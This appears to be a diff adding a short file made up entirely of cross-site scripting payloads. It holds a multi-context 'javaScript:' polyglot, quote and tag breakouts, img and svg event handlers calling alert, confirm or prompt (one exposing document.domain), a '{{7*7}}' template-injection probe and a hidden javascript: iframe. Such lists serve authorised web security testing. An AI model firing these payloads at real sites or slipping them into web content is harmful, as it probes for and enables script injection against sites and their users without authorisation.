@@ -1,0 +1,7 @@
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+\");alert(1);"
+<--`<img/src=` onerror=confirm``> --!>
+'"><svg/onload=prompt(5);>{{7*7}}
+ "><img src=x onerror=prompt``>
+ ">TEST<img src=K onerror=prompt(document.domain)>
+Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
